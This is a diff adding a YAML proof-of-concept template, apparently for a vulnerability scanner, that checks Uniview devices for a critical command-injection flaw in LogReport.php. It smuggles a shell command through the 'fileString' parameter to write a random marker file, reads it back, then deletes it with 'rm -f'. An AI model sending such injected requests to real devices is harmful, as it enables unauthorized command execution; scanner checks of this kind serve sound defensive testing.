@@ -1,0 +1,33 @@
+name: yaml-poc-uniview-uniview-other-CT-446255
+binding: 972a806f-4aa1-4e6b-a155-867a46ec9eba
+detail:
+    author: system_user
+    links:
+        - https://www.cnblogs.com/charon1937/p/14076959.html
+    vulnerability:
+        id: 2dddd331-ad2a-48eb-be1c-a4be9c2b941b
+        level: critical
+transport: http
+set:
+    s1: randomLowercase(5)
+    s2: randomLowercase(20)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{s2}}>{{s1}}.txt
+        expression: response.status == 200
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /Interface/LogReport/{{s1}}.txt
+        expression: response.body.bcontains(bytes(string(s2)))
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;rm%20-f%20{{s1}}.txt
+        expression: response.status == 200
+expression: r1() && r2() && r3()
